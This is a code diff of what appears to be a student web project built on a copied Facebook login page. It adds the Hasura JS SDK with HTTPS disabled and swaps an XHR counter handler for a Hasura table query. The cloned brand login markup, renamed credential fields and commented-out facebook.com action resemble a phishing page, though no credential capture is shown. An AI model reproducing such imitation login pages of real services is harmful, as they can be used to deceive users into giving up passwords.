@@ -7,6 +7,15 @@
     <script>
         window._cstart = +new Date();
     </script>
+
+
+  <script src="https://github.com/hasura/js-sdk/releases/download/v0.1.1/hasura.min.js"></script>
+    <script>
+        hasura.setBaseDomain('shivam.hasura.me');
+        hasura.disableHttps(); // No HTTPS enabled on local-development
+    </script>
+
+
     <script>
         function envFlush(a) { function b(c) { for (var d in a) c[d] = a[d]; } if (window.requireLazy) { window.requireLazy(['Env'], b); } else { window.Env = window.Env || {}; b(window.Env); } } envFlush({ "ajaxpipe_token": "AXhcXkixjdDbTWW6", "timeslice_heartbeat_config": { "pollIntervalMs": 33, "idleGapThresholdMs": 60, "ignoredTimesliceNames": { "requestAnimationFrame": true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true }, "enableOnRequire": false }, "shouldLogCounters": true, "timeslice_categories": { "react_render": true, "reflow": true }, "khsh": "0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe-0unjdojnx-0unjdojnx0-0gdubi^rdbsduOdv-0`sj`e`r-0q`xm`r-0StoRbs`qhof-0mhoj^q`xm`r", "dom_mutation_flag": true, "timesliceBufferSize": 5000 });
     </script>
@@ -106,7 +115,7 @@
                                             <td class="html7magic"><label for="pass">Password</label></td>
                                         </tr>
                                         <tr>
-                                            <td><input type="email" class="inputtext" name="email1" id="email" tabindex="1" data-testid="royal_email"
+                                            <td><input type="text" class="inputtext" name="email1" id="email" tabindex="1" data-testid="royal_email"
                                                 /></td>
                                             <td><input type="password" class="inputtext" name="pass1" id="pass1" tabindex="2" data-testid="royal_pass"
                                                 /></td>
@@ -488,32 +497,29 @@ button.onclick = function ()
     console.log(email.value);
     
     
-    request.onreadystatechange=function ()
-    {
-        if(request.readyState===XMLHttpRequest.DONE)
-        {
-            if(request.status===200)
-            {
-                var counter=request.responseText;
-                var span=document.getElementById('count');
-                
-                span.innerHTML=counter.toString();
-        
-            }
-            else{
-            }
-        }
-        
-        console.log("on ready state change method executed"+request.responseText);
-        
-    };
+function mySuccessHandler (data) {
+  console.log(data);
+}
+
+function myErrorHandler (e) {
+  console.log(e);
+}
+
+hasura.data.query({
+  type: 'select',
+  args: {
+    table: 'article',
+    columns: ['*']
+  }},
+  mySuccessHandler,
+  myErrorHandler
+);
     
    // request.open('GET','http://shivamd20.imad.hasura-app.io/counter',false);
    // request.send(null);
     
 };
-
-    </script>
+  </script>
 
 
 <!--action="https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110"-->
